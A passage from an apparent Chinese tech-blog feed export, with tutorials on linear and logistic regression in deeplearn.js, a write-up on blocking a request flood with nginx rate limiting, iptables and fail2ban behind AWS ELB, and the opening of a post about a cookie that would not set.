首先，去年做完 year end review 後，我就發現假日也在工作的時間有點太多，除了有些時候的確是 project 較為忙碌，但大多是自己平日上班專注力沒有好好發揮。
因此今年開始，我調整作息，除了早上運動外，也盡量在公司時保持專注，降低與社群媒體的接觸，從圖表結果來看，成效挺好的，明顯看到 2018 年的假日在 Work 這個分類，是比較空的。
另外，Training 與 English 分類的差異從 Calendar 圖表非常明顯啊！
2018 我幾乎每天都有抽出一點時間學習工作外的事，持續練英文的時間也變多了！
結論在製作第一年的 Year End Review 時，只是覺得好玩，可以把紀錄一年的資料做個整理跟視覺化呈現，但到了第二年，有了對照後，好像真的可以從中看出自己一年來的成長，也在整理資料的過程中，回顧了這一年所做的事情，並反省自己的缺失。雖然整體上來說，還是覺得自己浪費了許多時間，但套句李笑來的話：『所有對於現狀的解脫，最終都只能靠積累來實現。』從現在開始繼續努力、繼續積累，活在未來！
資料來源
nivo
一起用 Google Calendar 與 D3.js 進行年終回顧吧！

關於作者：@arvinh 前端攻城獅，熱愛數據分析和資訊視覺化
]]></content>
      <tags>
        <tag>d3</tag>
        <tag>data</tag>
        <tag>visualization</tag>
        <tag>nivo</tag>
        <tag>google calendar</tag>
        <tag>yearend</tag>
      </tags>
  </entry>
  <entry>
    <title>用 Javascript 進行邏輯迴歸分析</title>
    <url>/2018/04/07/deeplearnjs-logistic-regression/</url>
    <content><![CDATA[前言上一篇文章中，我們利用 Deeplearn.js 學習了 linear regression，從氣溫與紅茶的關聯性中預測銷量，這次就來練習在機器學習中另一個很基本的方法 - Logistic regression（邏輯分析）。
先來張 Demo 成果圖：
 
從成果圖中可以看出，所謂的 Logistic regression 與 Linear regression 最大不同就是，邏輯回歸大多用來進行分類，當結果只有兩種時，就是二元分類，當然也有多元分類，這邊以簡單二元分類來做練習。這次的範例參考自 【webAI】deeplearn.js的邏輯回歸
出發總要有個方向，做實驗總要有個想像還記得小時候剛了解智商的概念時，很喜歡去查查名人們的智商數字，像是愛因斯坦、前美國總統布希等等，想看看這些名人的智商是多少，是不是真的很聰明才能像他們這樣成功。今天假設我們有一群人的智商資料，現在想要利用這些資料分割出聰明人與笨蛋兩個分類，讓我們之後可以用來判斷一個人是聰明的率高一些，或是愚昧機率高一點，那我們該怎麼做呢？
這時候就可以出動 Logistic regression 來幫我們計算出一個預測模型，用來判斷該人的智商屬於哪個分類的機率比較高。
以迴歸分析來說，我們是希望能由給定一個固定的解釋變數 X，然後求出目標變數 Y 的平均值，是條件期望值的概念，若 Y 的結果是連續性的，我們就能試著透過線性模型去逼近一個剛好符合所有資料的公式。像是上一次的範例中，我們可以用線性模型求出在各種溫度下，紅茶的銷售狀況大約會是多少。
但有些時候，想求得的目標變數是二元或是多元的變數，像是剛剛例子中的聰明 或 笨蛋。如果硬要用線性函數去逼近的話，求得的結果通常會很差，像是下圖這般：
(圖片來源)
所以才有人提出用 sigmoid 這個能將數值侷限在 0 與 1 之間的函數來解決這個問題：

上圖就是一個 sigmoid function，假設我們今天判斷智商 180 代表機率 1 的狀況，而大於機率 0.6 時，就可以算是聰明人（黃色區域），而小於 0.6 的則屬於笨蛋（綠色區域），那今天我們的目標就是要找出一個 Ｘ 軸上的 Z 值，讓我們能根據 input 的 X 特徵值來判斷，若是 X 大於 Z 時，就可說他是聰明人（因為機率高於 0.6）。
這個讓我們找出 Z 值的函數就是我們要找的 Decision Boundary，也就是開頭 Demo 圖中的那條黃色線段！
有關於 Logistion regression 與 Decision Boundary 的詳細內容，我推薦大家閱讀這幾篇 blog，介紹得很簡單易懂：
Machine Learning 學習日記你可能不知道的邏輯迴歸
大概了解 Logistic 後，那就來利用 deeplearn.js 找出 Decision Boundary 吧!起手式，先來製作個假資料：
// 建立假資料，1 代表智商 100 分以上，0 代表智商 100 分以下const data = [] for (let i=0; i&lt;200; i++) &#123;    let tmpX1 = Math.random() * 120 + 60;    let tmpX2 = Math.random() * 120 + 60;    data.push(&#123;        x: tmpX1,        y: tmpX2,        c: tmpX1 &gt; 100 &amp;&amp; tmpX2 &gt; 100 ? 1: 0    &#125;);&#125;

我們隨機產生 200 組 training data，tmp_x 與 tmp_y 可以當作我們要輸入的 Input 特徵 X 向量，代表一個人的智商以及他閱讀的書籍量。
接著初始 deeplearn.js 的資料結構：
/** * deeplearn.js 運算 */const x_list = [];const y_list = [];for (let elem of data) &#123;    x_list.push([elem.x, elem.y]);    y_list.push(elem.c);&#125;const x_data = dl.tensor2d(x_list);const y_data = dl.tensor2d(y_list);

再次介紹一下，在 deeplearn.js 中，tensor 是最核心的資料結構，用來表示向量、矩陣或是多維度的資料。
有許多 utility function 可以輔助創建 tensor 資料結構，像是這邊用的是 tensor2d，也就是 2D (2-dimension) 的 tensor。
一個 tensor 其實包含三個成分，也是創建 tensor 時可以傳入的參數：

values (TypedArray|Array): tensor 的值。可以是 nested array 或 flat array 的結構。

shape（number[]）:基本上就是該 tensor 的維度。若創建 tensor 時沒有指定維度，就會繼承傳入的 values 維度。也可以像這邊的範例一樣直接使用 tensor$&#123;1|2|3|4&#125;d 來創建

dtype（float32’|’int32’|’bool）：值的型別，當然是 optional。


由於我們要計算的 X 都是一組向量，所以這邊使用 dl.tensor2d 來建置一個二維的 tensor。
接著定義我們要 training 的係數，這邊取為 W 與 B：
// 權重 W 與偏差 Bconst W = dl.variable(dl.zeros([1, 2]));const B = dl.variable(dl.zeros([1]));

dl.variable(initialValue, trainable?, name?, dtype?) 用來創建 training 過程中需要的變數，也可透過參數指定該變數能否在 training 過程中被修改（trainable），預設是 true。
用 dl.zeros([1, 2]) 來創建一個 Shape 為 [1,2] 的填滿零值的 tensor 變數當權重 W，以及維度 1 的偏差變數 tensor B。
再來需要定義目標函數與 loss function：
// 定義目標函數 與 loss function （最一般的 mean square）// logistic regression 模型const f = x =&gt; dl.sigmoid(W.matMul(x.transpose()));// loss function（log loss）const loss = (pred, label) =&gt; dl.mean(dl.neg(dl.sum(dl.mul(label, dl.log(pred)))));

目標函數的部分其實就是帶入先前所提的 sigmoid function：

Z 就是我們要找的 boundary，就是權重與 input X 向量做矩陣乘法，所以這裡需要轉置矩陣 x.transpose()。dl.sigmoid() 就是 deeplearn.js 提供的 sigmoid 函數（如上圖第二行）
將 Z 帶入 dl.sigmoid() 後就獲得了目標函數 f。
而 loss function 的話，一般在 logistic function 都是採用 log loss 的公式，詳細解釋與公式推導推薦閱讀此篇：用人話解釋機器學習中的 Logistic Regression
照著公式很容易就可以帶出上述的 loss()。
最後就可以開始 training 我們的 data 啦：
// 梯度優化const learningRate = 0.001const optimizer = dl.train.sgd(learningRate)// Training!for (let i = 0; i &lt; 1000; i++) &#123;    optimizer.minimize(() =&gt; loss(f(x_data), y_data))&#125;

跟上一篇 linear regression 相同，我們採用dl.train.sgd，是 deeplearn.js 內建的 sgd 演算法模型，接受一個 leanring rate 參數。在每一次的迭代中，係數都會不斷被更新，以找出最佳的結果，而這個 learningRate 參數是用來控制每一次的更新幅度。因此不能夠設得太大，也不能設得太小。
optimizer 可額外輸入兩個參數，分別控制 1. 是否回傳最後的 cost; 2. 限制只更新哪些變數。我們 for loop 1000 次後，利用 dataSync() 來將係數從 Tensor 讀出：
// 用 dataSync 取得 training 結果const wPredict = W.dataSync();const bPredict = B.dataSync();console.log(wPredict, bPredict);

dataSync() 是 Synchronously 的，會 block Browser 的 UI thread，直到 data 被你讀出。另外還有個 Asynchronously 的 data() method，會回傳 promise，當讀取結束時再呼叫 resolves。
因為接下來要用 Highcharts 畫圖，所以需要採用 dataSync() 來 block 著 UI thread 等資料讀出後再繼續。
取出係數的值後，就能算出一條 Decision Boundary 並繪製出來！
根據算出的係數，畫出線條頭尾兩點：
// 計算切割線段const data_line = [    [60, parseFloat((180 * wPredict[0] + bPredict[0])/wPredict[1])],    [180, parseFloat((60 * wPredict[0] + bPredict[0])/wPredict[1])]];console.log(data_line);

然後用 HighCharts 繪圖：
// 繪製圖形const data_scatter1 = [];const data_scatter2 = [];for (let elem of data) &#123;    if (elem.x &gt; 100 &amp;&amp; elem.y &gt; 100) &#123;        data_scatter1.push([elem.x, elem.y]);    &#125; else &#123;        data_scatter2.push([elem.x, elem.y]);    &#125;  &#125;        // Resultconst options = &#123;    title: &#123;        text: &#x27;deeplearn.js 你是聰明人嗎？&#x27;                     &#125;,    xAxis: &#123;        title: &#123;          text: &#x27;智商&#x27;                         &#125;,        min: 60,        max: 180    &#125;,    yAxis: &#123;        title: &#123;          text: &#x27;書讀得多寡&#x27;                         &#125;,        min: 60,        max: 180    &#125;,    series: [        &#123;            type: &#x27;line&#x27;,            name: &#x27;Decision Boundary&#x27;,             color: &#x27;#fff600&#x27;,            data: data_line        &#125;,          &#123;            type: &#x27;scatter&#x27;,            name: &#x27;Smart&#x27;,             marker: &#123;                symbol: &#x27;cross&#x27;,                  radius: 4                     &#125;,            color: &#x27;#FF0000&#x27;,            data: data_scatter1        &#125;,        &#123;            type: &#x27;scatter&#x27;,            name: &#x27;Stupid&#x27;,            marker: &#123;                symbol: &#x27;cross&#x27;,                  radius: 4                     &#125;,            color: &#x27;#6B8E23&#x27;,            data: data_scatter2        &#125;    ]&#125;;// 图表初始化函数const chart = Highcharts.chart(&#x27;app&#x27;, options);

最終成果See the Pen DeeplearnJS-logistic-regression by Arvin (@arvin0731) on CodePen.


結論再次使用 deeplearn.js 來實作 Machine Learing 演算法，發現真的要套用這些 library 已經非常容易了，但還是受限於對演算法與數學公式的理解與敏銳度，不過也是透過這樣的實作練習，逼迫自己去嘗試了解這些演算法背後的概念與數學，在過程中也不斷想起以前大學修離散數學的記憶，當時都不太懂要怎麼使用這些數學，現在知道後就能讀得津津有味，也是蠻有意思的！

資料來源
【webAI】deeplearn.js的邏輯回歸
GitHub Deeplearnjs
Deeplearn js API doc
用人話解釋機器學習中的 Logistic Regression
Machine Learning 學習日記
你可能不知道的邏輯迴歸
機器學習-支撐向量機(support vector machine, SVM)詳細推導

關於作者：@arvinh 前端攻城獅，熱愛數據分析和資訊視覺化
]]></content>
      <tags>
        <tag>javascript</tag>
        <tag>deeplearnjs</tag>
        <tag>machine learning</tag>
        <tag>logistic-regression</tag>
      </tags>
  </entry>
  <entry>
    <title>用 Javascript 進行簡單線性迴歸分析</title>
    <url>/2018/03/10/deeplearnjs-simple-linear-regression/</url>
    <content><![CDATA[前言約莫兩個月前，我利用 p5-deeplearn-js 這套工具在 Chrome extension 中玩了一下機器學習的應用 (請參閱前端也能玩 Deepleaning - 以 p5-deeplearn-js 為例)，當時雖然有去看他們的 source code，但對於底層 deeplearnjs 的部分並沒有仔細去了解，畢竟還是要對 ML 有根本的了解，才能讀得懂。
而隨著 Google 發布 Machine Learning Crash Course，再度讓我有了研究 deeplearn.js 的念頭，但萬事起頭難，一開始不能太勉強自己，所以本文就先從最簡單的 linear regression 實作開始，來熟悉一下基本操作！
照慣例先來張 Demo 成果圖：
 
範例是從 這篇文章 中獲得的靈感，假資料也是取自該處。
先進入假想情境！想像一下你是一間飲料店老闆，在經濟不景氣的情況下，你需要嚴格控管你的進貨成本，因此，聰明的你開始觀察各種可能，最後發現天氣的變化與你的飲料銷售量有很大的關聯！
然而，氣象資料很好取得，但你需要的是能夠預測在哪種天氣下，你需要進多少貨，以此來控管每一次的進貨量。
也就是說，你需要一個公式！
這個公式要能夠讓你輸入一個特徵 X（也就是氣溫度數），接著透過運算後產生一個目標變數 Y（也就是飲料銷售量）。
能當到老闆，想必數學不會太差，整理一下後發現，我們只有一個自變量 X，以及因變量 Y，因此可以嘗試用一個簡單的線性函數來逼近這公式：
Y = aX + b
問題就來了，要怎麼樣找出適合的係數 a 與 b 呢？
先別急，讓我們先把資料整理一下資料分析的第一步一定是先取得資料，身為飲料店老闆，要取得銷售資量應該不難，再上網查個氣象資訊就好，因此可以得到如下資料：
// 建構資料 （當然是假的）const degrees = [29, 28, 34, 31, 25, 29, 32, 31, 24, 33, 25, 31, 26, 30];const salesVolume = [77, 62, 93, 84, 59, 64, 80, 75, 58, 91, 51, 73, 65, 84];

資料是成對關係，氣溫 29 度，冰紅茶銷售量 77。
接著我們可以先利用 HighCharts 把資料先視覺化出來，你就會很有感覺我們該做什麼。
See the Pen DeeplearnJS-simple-linear-dataset by Arvin (@arvin0731) on CodePen.


嗯…看起來這些點似乎真的可以用一個線性函數去逼近呢！而且更棒的是，透過這些過往資料，應該是有助於我們找出公式中最棒的係數的！
接著就該 Linear regression 就登場了！在機器學習的領域中，像我們這樣依靠大量資料來輔助學習的，稱作監督式學習。
而當公式中的目標變數（也就是 y）是連續型（continuous）的變數時，這樣的學習問題會稱為回歸（regression）問題。
那一個線性函數的回歸問題，就是線性迴歸 (linear regression) 了。
關於 Linear regression 的一些數學公式推導等等，我推薦大家閱讀這篇文章：史丹佛大學機器學習（Machine Learning）上課筆記（一）
裡面解釋得淺顯易懂，絕對比我解釋得還好…
就算不清楚線性迴歸，光看公式應該也知道，我們可以透過大量的迭代測試，不斷輸入 X，然後調整 a 與 b 來求出 Y，然後找出在所有 input 中，能得到與所有真實資料差距最小的一對係數即可。
用線性回歸的概念來解釋，就是我們需要有一個 cost function（或稱 loss function），藉由不同係數的輸入，從公式得出的值來與實際資料比較，想辦法找出結果差距最小的係數。
一般來說，cost function 會用 LMS（least mean squares）演算法來處理，可以先猜一個初始係數值，然後藉由 LMS 來不斷更新係數，直到找出最小差距的情況。
但這是單一 training sample 的狀況，當有多個 training sample 時，通用的演算法稱為 stochastic gradient descent (sgd)，概念雷同，就像是根據每一筆 training sample 去跑一次 LMS。
一樣，還是請大家去閱讀 史丹佛大學機器學習（Machine Learning）上課筆記（一），獲得更正確的概念。畢竟這次主要是練習如何用 deeplearnjs 來實作。
解法都有了，那就來看看到底怎麼用 Javascript 實作吧！要使用 deeplearn.js，只需要從 cdn 載入即可：
&lt;script src=&quot;https://unpkg.com/deeplearn@latest&quot;&gt;&lt;/script&gt;

接著，我們要先初始化資料：
// 建構資料const degrees = [29, 28, 34, 31, 25, 29, 32, 31, 24, 33, 25, 31, 26, 30];const salesVolume = [77, 62, 93, 84, 59, 64, 80, 75, 58, 91, 51, 73, 65, 84];// 運用 Deeplearn.js 結構化資料// dl 就是 deeplearn.js 的 global 變數const degrees_data = dl.tensor1d(degrees);const salesVolume_data = dl.tensor1d(salesVolume);

在 deeplearn.js 中，tensor 是最核心的資料結構，用來表示向量、矩陣或是多維度的資料。
有許多 utility function 可以輔助創建 tensor 資料結構，像是這邊用的是 tensor1d，也就是 1D (1-dimension) 的 tensor。
一個 tensor 其實包含三個成分，也是創建 tensor 時可以傳入的參數：

values (TypedArray|Array): tensor 的值。可以是 nested array 或 flat array 的結構。

shape（number[]）:基本上就是該 tensor 的維度。若創建 tensor 時沒有指定維度，就會繼承傳入的 values 維度。也可以像這邊的範例一樣直接使用 tensor$&#123;1|2|3|4&#125;d 來創建

dtype（float32’|’int32’|’bool）：值的型別，當然是 optional。


初始化好 deeplearn.js 的資料結構後，接著定義我們要 training 的係數，這邊取為 aw 與 ba：
// 要 train 的參數 aw, baconst aw = dl.variable(dl.scalar(Math.random()));const ba = dl.variable(dl.scalar(Math.random()));

dl.variable(initialValue, trainable?, name?, dtype?) 用來創建 training 過程中需要的變數，也可透過參數指定該變數能否在 training 過程中被修改（trainable），預設是 true。
其中 initialValue 可以是一個 Tensor，也可以像我們這邊一樣，傳入 dl.scalar。
dl.scalar 是維度為 0 的 tensor，基本上 0 維就是一個點，由於我們只需要亂數產生一個初值給 aw 與 ba，因此用 dl.scalar 即可。
再來，我們定義目標函數與 loss function
// 定義目標函數 與 loss function （最一般的 mean square）// f = aw * X + baconst f = x =&gt; aw.mul(x).add(ba);const loss = (pred, label) =&gt; pred.sub(label).square().mean();

在 deeplearn.js 中，函數的建構蠻直覺的，y = a * x + b 可以直接寫成  y = x =&gt; a.mul(x).add(b)
loss function 則是接收兩個參數的函式，pred 就是 training data 中的自變因 x 透過目標函數 f，計算出的值，而 label 是 training data 中的答案 y。
然後，定義我們的 Optimizer，也就是用來最佳化 loss function 結果的演算法，這邊採用 stochastic gradient descent (sgd)：
// 採用 stochastic gradient descent 來做最佳化 // learning rate 這邊不能設太大const learningRate = 0.0005;const optimizer = dl.train.sgd(learningRate);

dl.train.sgd 是 deeplearn.js 內建的 sgd 演算法模型，接受一個 leanring rate 參數。在每一次的迭代中，係數都會不斷被更新，以找出最佳的結果，而這個 learningRate 參數是用來控制每一次的更新幅度。因此不能夠設得太大，也不能設得太小。
利用定義好的目標函數 f、loss function 與 optimizer，我們可以就開始 training modal 了！
// trainingfor (let i = 0; i &lt; 30; i++) &#123;  const cost = optimizer.minimize(() =&gt; loss(f(degrees_data), salesVolume_data), true, [aw, ba])  console.log(&#x27;cost&#x27;);  cost.print();  console.log(&#x27;aw&#x27;);  aw.print();  console.log(&#x27;ba&#x27;);  ba.print();&#125;

最核心的就是這一行：
const cost = optimizer.minimize(() =&gt; loss(f(degrees_data), salesVolume_data), true, [aw, ba])
使用 optimizer 的方式如上所示，輸入執行 loss function 的函示，並可額外輸入兩個參數，分別控制 1. 是否回傳最後的 cost; 2. 限制只更新哪些變數。
我們簡單 for loop 30 次（因為資料量很少…你要 train 一百次也行，但這邊結果不會有什麼差別）
過程中若想要 debug，可以像我一樣用 tensor.print() 的方式把 traning 過程的係數變化 log 出來。
最後，當 training 結束後，透過 dataSync() 將最終係數從 Tensor 中讀出：
// 利用 dataSync() 取出 training 後得到的係數const awPredict = aw.dataSync();const baPredict = ba.dataSync();

很容易看出 dataSync() 是 Synchronously 的，會 block Browser 的 UI thread，直到 data 被你讀出。另外還有個 Asynchronously 的 data() method，會回傳 promise，當讀取結束時再呼叫 resolves。
在我們的範例中，因為接下來要用 Highcharts 畫圖，我們需要 block 著 UI thread 等資料讀出後再繼續，因此採用 dataSync()。
取出係數的值後，就能夠畫圖啦～
根據算出的係數，畫出線條頭尾兩點：
const dataLine = [    [22, parseFloat(22 * awPredict + baPredict)],    [35, parseFloat(35 * awPredict + baPredict)]]

然後用 HighCharts 繪圖：
const options = &#123;    title: &#123;        text: &#x27;deeplearn.js  最高溫與紅茶銷售量&#x27;                     &#125;,    xAxis: &#123;      title: &#123;        text: &#x27;氣溫&#x27;                       &#125;,      min: 20,      max: 40    &#125;,    yAxis: &#123;      title: &#123;        text: &#x27;銷售量&#x27;                       &#125;,      min: 40,      max: 100    &#125;,    series: [        &#123;            type: &#x27;line&#x27;,            name: &#x27;predict line&#x27;,            data: dataLine        &#125;,          &#123;            type: &#x27;scatter&#x27;,            name: &#x27;dataset&#x27;,            marker: &#123;                symbol: &#x27;cross&#x27;,                  radius: 4                     &#125;,            data: dataset        &#125;    ]&#125;// 繪製圖表const chart = Highcharts.chart(&#x27;app&#x27;, options);

最終成果See the Pen DeeplearnJS-simple-linear by Arvin (@arvin0731) on CodePen.


結論初次使用 deeplearn.js 其實主要門檻還是在於對 Machine Learning 的了解不夠，我有稍微比對一下用 python 與 R 的做法，其實都很雷同，包含資料向量的概念都是，加上很多演算法在這些語言的 library 中都有內建，相信對 ML 與 DL 有深入了解的人來學習 deeplearn.js 會更得心應手。deeplearn.js 畢竟有 Google 支持，也支援 TensorFlow 的 modal，還是很值得投資學習的，想想未來能用別人的 browser 來 training 你的 modal 有多好啊！喔不，是想想未來 Web 能因此有更多的發展潛力，多好呀！

資料來源
GitHub Deeplearnjs
Deeplearn js API doc
機器學習 玩具資料與線性迴歸
史丹佛大學機器學習（Machine Learning）上課筆記
deeplearn.js的線性迴歸
8 大JavaScript 機器學習框架之探索

關於作者：@arvinh 前端攻城獅，熱愛數據分析和資訊視覺化
]]></content>
      <tags>
        <tag>javascript</tag>
        <tag>deeplearnjs</tag>
        <tag>machine learning</tag>
        <tag>linear-regression</tag>
      </tags>
  </entry>
  <entry>
    <title>與 DDoS 奮戰：nginx, iptables 與 fail2ban</title>
    <url>/2016/08/12/defend-against-ddos-with-nginx-iptable-and-fail2ban/</url>
    <content><![CDATA[前言最近發生主機被大量 request 攻擊的事件，而且慘的是這台主機放的是論壇服務假設攻擊的點是論壇首頁，每次 request 都會去 query DB，而且有一堆 join其中還有些是 POST 的指令會讓 db update就這樣一直瘋狂又 select 又 update 導致 DB lock，cpu 飆高掛掉  
如果論壇是自己寫的，還可以在 DB 跟 application 之間加上 redis 之類的快取但偏偏這個論壇系統是別人的，沒有辦法動  
先簡單講一下架構，為了分散流量，前面有一台 AWS ELB 做 load balancing，後面有兩台機器，所有 request 都會先到 ELB，再自動到後面兩台其中一台。
WAF被攻擊之後怎麼辦呢？第一個想到的就是從 aws 提供的服務：WAF 來擋https://aws.amazon.com/tw/waf/
可是發現 WAF 跟原本想的不一樣，他沒有辦法設定像是：「擋掉 10 秒鐘內發超過 100 個 request 的 IP」這種規則
nginx只能繼續在網路上找解法，找到從 nginx 來擋的解法：  
nginx防止DDOS攻击配置通过Nginx和Nginx Plus阻止DDoS攻击Module ngx_http_limit_req_module
http &#123;  //觸發條件，限制 ip 每秒 10 個 request  limit_req_zone $binary_remote_addr zone=one:10m rate=10r/s;     server &#123;    location  ~ \.php$ &#123;      //執行的動作      limit_req zone=one burst=5 nodelay;       &#125;  &#125;&#125;

總之就是利用 limit_req_zone，這個 nginx 提供的東西宣告一個 10mb 的 zone 叫做 one 來儲存狀態，這裡的 10r/s 指的就是一秒 10 個 request  
接著在你想擋的地方加上：limit_req zone=one burst=5 nodelay;，就可以擋掉了nginx 會把處理 request 的數量調整成「最多 1 秒 10 個」，如果那個 ip 在同一時間有超過 5 個 request 還沒處理的話，就會傳回 503 service temporarily unavailable，這邊的 5 就是 burst 設定的值傳回去的 status code 也可以自己指定，例如說：limit_req_status 505;
儘管這個解法看起來很棒，但不知道為什麼，加了之後好像沒有用似的伺服器的警報還是一直在響，DB 還是持續飆高  
iptables在請教過其他同事之後，得知 iptabls 也可以擋，而且還是直接從 tcp 層擋找到下面兩篇資料：
淺談DDoS攻擊防護  
-A INPUT -p tcp –dports 80 -j WEB_SRV_DOS-A WEB_SRV_DOS -p tcp –syn –dports 80 -m recent –rcheck –second 30 –hitcount 200 -j LOG –log-prefix &quot;[Possible DOS Attack]&quot;-A WEB_SRV_DOS -p tcp –syn –dports 80 -m recent –rcheck –second 30 –hitcount 200 -j REJECT  -A WEB_SRV_DOS -p tcp –syn –dports 80 -m recent –set  -A WEB_SRV_DOS -p tcp –dports 80 -j ACCEPT

運用 iptables 限制同一IP單位時間連線數  
-A INPUT -p tcp --dport 80 -m recent --rcheck --seconds 1 --hitcount 5 --name HTTP_LOG --rsource -j DROP-A INPUT -p tcp --dport 80 -m recent --set --name HTTP_LOG --rsource-A INPUT -p tcp --dport 80 -j ACCEPT

兩個的原理都一樣，是透過-m recent –rcheck –second 30 –hitcount 200 這段敘述，描述說你要擋住幾秒內發送幾次的 request，把這個連線 reject 或是 drop。  
直接從 iptables 去擋聽起來是個更好的解法，這樣 request 連 nginx 都不會進去就被擋住了，可是天不從人願，用了之後發現還是不行！怎麼會這樣呢！
fail2ban心灰意冷之下，同事又推薦一個好東西叫做：fail2ban，查了一下之後發現用法非常簡單，而且原理很好懂，決定用別台機器來測測看，測試成功之後再套用到正式環境的機器。
用 Fail2Ban 防範暴力破解 (SSH、vsftp、dovecot、sendmail)fail2ban教學Ubuntu 中使用 fail2ban 針對大量 access 做判斷及阻擋  
綜合其中幾篇的敘述，可以得出以下流程  
1.修改vim /etc/fail2ban/jail.local2.寫入  
[http-get-dos]enabled = trueport = httpfilter = http-get-doslogpath = /var/log/nginx/access.log # 要判斷的logmaxretry = 100 # 最多幾次findtime = 5 # 時間區間bantime = 600 # 要 ban 多久action = iptables[name=HTTP, port=http, protocol=tcp]

上面的規則就是：5 秒內嘗試 100 次失敗之後就 ban 600 秒  
3.新增/etc/fail2ban/filter.d/http-get-dos.conf這邊的檔名就是對應到剛剛 jail.local 設定的名稱  
[Definition]failregex = ^&lt;HOST&gt;- - .*\&quot;(GET|POST).*ignoreregex =

這裡的failregex要根據你的 log 去寫，像是 nginx 的 access log 長這樣：  
106.184.3.122 - - [21/Jul/2016:11:38:29 +0000] &quot;GET / HTTP/1.1&quot; 200 396 &quot;-&quot; &quot;Go-http-client/1.1&quot;

你就寫一個可以抓到&lt;HOST&gt;，也就是 ip 的 regular expression  
都設定好之後，重開一下應該就有效了，就會發現一直發 request 之後自己順利的被 ban 掉可以用 iptables --list 看一下自己是不是真的有被 ban  
fail2ban 的原理應該就是去看你指定的 log 檔跟規則，用這個檔案去判斷是不是超出設定的規則，超出的話就把 ip 抓出來，加規則到 iptables 裡面去擋掉，時間到了之後再把規則移除掉  
根據伺服器架構調整試到這邊，終於成功了！可是既然原理也是 iptables，為什麼剛剛不行呢？還記得一開始我提過伺服器架構嗎？前面一台 ELB，後面兩台 web server因為 ELB 是 AWS 提供的服務，所以客製化程度很低，甚至連 ssh 進去都不行因此上面嘗試的方案都是個別套用到那兩台 web server  
這時候問題就來了：  

咦？那這樣子 web server 的 request 的來源，不就都是 ELB 的 ip 了嗎？

沒錯，你突破盲點了！之前沒有用就是卡在這邊你用 iptables 來檔，因為來源都是 ELB 的 ip，所以會擋掉的只有 ELB，而不是真正的攻擊來源，所以會造成 ELB 被擋掉，整個服務就因為一個攻擊者被搞的超級慢
所以在這個網路環境底下，iptables 是行不通的！那 nginx 呢？還記得我們的規則嗎？  
limit_req_zone $binary_remote_addr zone=one:10m rate=10r/s; 

$binary_remote_addr抓到的也都會是 ELB 的 ip  
這時候靈機一動突然想到，那能不能根據X-Forwarded-For這個 header 來設定呢？就會是真的 IP 了找到這一篇：nginx rate limiting with X-Forwarded-For header
把$binary_remote_addr換成$http_x_forwarded_for
搞定！大功告成經歷一番千辛萬苦，最後終於在 nginx 把攻擊流量擋掉用 JMeter 測試之後也發現確實成功了，多的 request 會直接回傳 503，最後成功解決主機被攻擊的問題。
關於作者：@huli 野生工程師，相信分享與交流能讓世界變得更美好
]]></content>
      <tags>
        <tag>DDoS</tag>
        <tag>nginx</tag>
        <tag>iptable</tag>
        <tag>fail2ban</tag>
      </tags>
  </entry>
  <entry>
    <title>我遇過的最難的 Cookie 問題</title>
    <url>/2017/03/24/difficult-problem-of-cookie/</url>
    <content><![CDATA[前言幾個禮拜前我在工作上碰到了一些跟 Cookie 有關的問題，在這之前，我原本想說：Cookie 不就那樣嘛，就算有些屬性不太熟悉，上網找一下資料就好了，哪有什麼跟 Cookie 有關的難題？
然而事實證明我錯了。我還真的碰到了一個讓我解超久的 Cookie 問題。
相信看到這邊，很多人應該躍躍欲試了，那我就先來考一下大家：

什麼情形下，Cookie 會寫不進去？

像是語法錯誤那種顯而易見的就不用說了，除此之外你可能會答說：寫完全不同 domain 的 Cookie。例如說你的網頁在 http://a.com 卻硬要寫 http://b.com 的 Cookie，這種情形當然寫不進去。
或者，你可能會回答：不在 https 卻想加上 Secure flag 的 Cookie。沒錯，像是這種情形也會寫不進去。
除了這些，你還能想到什麼嗎？
如果想不太到，那就聽我娓娓道來吧！
悲劇的開始在一個月前我寫了一篇跟 CSRF 有關的文章（讓我們來談談 CSRF），正是因為工作上需要實作 CSRF 的防禦，所以趁機研究了一下。簡單來說，就是要在 Cookie 設置一個 csrftoken。
可是那天我卻發現，我怎麼寫都寫不進去。
我的測試網站的網址是：http://test.huli.com，拿來寫 Cookie 的 script 是：
document.cookie = &quot;csrftoken=11111111; expires=Wed, 29 Mar 2020 10:03:33 GMT; domain=.huli.com; path=/&quot;

我就只是想對.huli.com寫一個名稱是csrftoken的 Cookie。而我碰到的問題，就是怎麼寫都寫不進去。
這段語法完全沒有問題，我檢查過好幾遍了，但就是不知道為什麼寫不進去。我們開頭講的那幾種 case 這邊都完全沒碰到。這只是一個簡單的 http 網站，而且是寫自己 domain 的 Cookie，怎麼會寫不進去？
剛開始碰到這情形，我還想說會不會是我電腦的靈異現象，在其他人的電腦上就好了，就暫時沒有管它，直到有一天 PM 跟我說：「咦，這個頁面怎麼壞了？」，我仔細檢查後才發現是因為他也寫不進去這個 Cookie，導致 server 沒有收到 csrftoken 而驗證失敗。
好了，看來現在已經確認不是我電腦上的問題了，而是大家都會這樣。可是，卻有其他人是正常的。其他人都可以，但就只有我跟 PM 兩個人不行。
幸好見過小風小浪的我知道，每次碰到這種詭異的問題，先開無痕模式再說，至少可以知道你的瀏覽器不會被其他因素給干擾。打開無痕模式之後發現，可以了，可以設定 Cookie 了。在一般情況下不行設定，但是開無痕瀏覽模式卻可以。
這就真的很奇怪了，到底為什麼不行呢？而且若是我把 Cookie 換了一個名字，叫做csrftoken2，就可以寫入了！就唯獨csrftoken這個名稱不行，可是 Cookie 總不可能有保留字這種東西吧！就算真的有，csrftoken也絕對不會是保留字。
這一切都太詭異了，到底csrftoken這個名字有什麼問題？到底為什麼寫不進去？
於是我就去拜了 Google 大神，用cookie 不能寫、cookie can not set、unable set cookie等等的關鍵字去搜尋，卻都一無所獲，找到的答案都跟我的情況完全不一樣。
我用 Chrome devtool 看了，明明http://test.huli.com就沒有任何的 Cookie，怎麼會寫不進去呢？
在經歷過一陣亂找資料之後，我還稍微去翻了 cookie 的 rfc：HTTP State Management Mechanism，但還是沒有找到相關資料。
最後不知道哪來的靈感，我就去 Chrome 的設定那邊檢視所有 huli.com 的 Cookie，並且一個一個看過之後刪掉。刪完之後，就可以正常寫入 Cookie 了。
仔細想想其實還滿合理的，畢竟無痕模式可以，就代表是以前做的一些事情會影響到寫 Cookie 這件事，再經由刪除 Cookie 就可以確認問題一定是出在其他有關的 Domain 身上，推測是其他 Domain 做了一些事情，才會造成 http://test.huli.com 沒辦法寫入 Cookie。
後來我回想起剛剛刪掉的那幾個 Cookie，發現存在一個也叫做csrftoken的同名 cookie。
撥雲見日難得讓我找到了一點線索，當然要跟著這條線索繼續查下去。
